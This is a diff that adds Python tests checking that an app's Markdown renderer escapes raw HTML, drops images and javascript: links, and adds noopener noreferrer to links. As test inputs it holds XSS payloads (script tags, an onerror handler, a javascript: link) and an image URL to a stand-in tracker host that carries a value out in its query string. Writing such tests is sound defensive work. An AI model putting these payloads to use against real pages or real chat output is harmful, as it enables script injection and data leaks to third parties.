@@ -84,3 +84,31 @@ def test_the_language_falls_back_through_query_cookie_account_and_default():
     assert resolve_language(request(user_language="en")) == "en"
     assert resolve_language(request()) == "pl"
     assert resolve_language(request(query="de", cookie="kl")) == "pl"
+
+
+def test_an_answer_in_markdown_is_rendered_as_markup():
+    html = str(
+        rendering.markdown("**Następne kroki:**\n- potwierdzić termin\n- przesłać dokumenty")
+    )
+    assert "<strong>Następne kroki:</strong>" in html
+    assert "<li>potwierdzić termin</li>" in html
+
+
+def test_raw_html_in_an_answer_is_escaped_not_rendered():
+    html = str(rendering.markdown('<script>alert(1)</script> <img src="x" onerror="alert(1)">'))
+    assert "<script>" not in html
+    assert "<img" not in html
+    assert "&lt;script&gt;" in html
+
+
+def test_an_answer_cannot_load_a_picture_or_link_to_script():
+    """A picture loads unasked, and its address could carry a restored value to its server."""
+    html = str(rendering.markdown("![x](https://tracker.example/p?d=Jan) [a](javascript:alert(1))"))
+    assert "<img" not in html
+    assert 'href="javascript:' not in html
+
+
+def test_a_link_in_an_answer_sends_no_referrer():
+    html = str(rendering.markdown("[polityka](https://example.com/polityka)"))
+    assert 'href="https://example.com/polityka"' in html
+    assert 'rel="noopener noreferrer"' in html
